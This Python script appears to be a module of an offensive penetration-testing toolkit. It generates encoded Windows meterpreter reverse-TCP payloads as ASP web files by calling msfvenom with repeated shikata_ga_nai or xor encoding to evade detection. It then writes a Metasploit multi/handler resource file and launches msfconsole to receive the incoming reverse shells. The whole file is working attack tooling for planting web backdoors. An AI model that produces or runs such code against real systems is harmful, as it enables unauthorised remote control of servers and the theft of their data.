#!/usr/bin/python
#
import os
import subprocess
from src.core import menus
from src.core.main import *
from time import sleep
from sys import exit

# interface ip
iface = iface_ip()

while 1:
	try:	
		# select payload
		selection = 0
		while selection != '1' or selection != '':
			clear()
			menus.asp_menu()
			selection = raw_input("%sSelection (default) > %s" % (colours.bold, colours.reset))
			if selection == '1' or selection == '':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/x64/meterpreter/reverse_tcp"
				break
		
		# get some user info
		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input("Enter a port (default 8080): ")
		if port == '':
			port = 8080
		filename = raw_input("Enter a name for asp file: ")
		
		# create payload
		if selection == '1' or selection == '':
			PrintInfo("Creating payload with x10 x86/shikata_ga_nai. Please wait...")
			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 10 -f asp > output/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()
		elif selection == '2':
			PrintInfo("Creating payload with x10 x64/xor. Please wait...")
			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e x64/xor -i 10 -a 64 -f asp > output/%s.asp" % (msfpath(), payload, ip, port, filename), shell=True).wait()

		
		# start multi handler
		answer = raw_input("\nStart matching handler Y/N? (Default Y) ")
		if not answer or answer in ('Y','y',''):
	
			# create rc file
			rcfile = "output/asp_listener.rc"
			fw = open(rcfile, "w")
			fw.write("use exploit/multi/handler\n")
			fw.write("set PAYLOAD %s\n" % payload)
			fw.write("set LHOST 0.0.0.0\n")
			fw.write("set LPORT %s\n" % port)
			fw.write("set ExitOnSession false\n")
			fw.write("set AutoRunScript migrate -f\n")
			fw.write("exploit -j -z")
			fw.close()
	
			# start listener
			subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
	
			PrintInfo("Cleaning up...")
			os.remove(rcfile)
			os.remove("output/"+filename+".asp")
			sleep(1)
			# return to main menu
			break
	
		else:
			PrintInfo("Payload created in your output directory.")
			
			# return to main menu
			EntContinue()
			break
	except KeyboardInterrupt:
		break
